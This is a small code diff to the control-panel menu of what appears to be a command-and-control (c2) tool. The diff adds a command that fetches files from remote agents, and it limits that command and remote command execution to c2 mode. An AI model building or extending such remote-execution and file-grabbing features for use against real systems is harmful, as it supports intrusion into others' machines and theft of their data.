@@ -41,6 +41,7 @@ def main():
 Control Panel:
     m:[MESSAGE] - Send a message
     f:[FILE_PATH] - Send file
+    g:[FILE_PATH] - Gets a file from an agent (c2 only)
     c:[COMMAND] - Execute a command (c2 only)
     l - List agents
     q - quit
@@ -51,7 +52,7 @@ Control Panel:
             elif command_input == 'q':
                 os._exit(0)
             elif command_input[0] in ('c', 'm', 'f', 'g'):
-                if not args.is_c2 and command_input.startswith('c'):
+                if not args.is_c2 and command_input[0] in ('c', 'g'):
                     print("C2 only command.")
                     continue
                 if command_input[1] != ':':
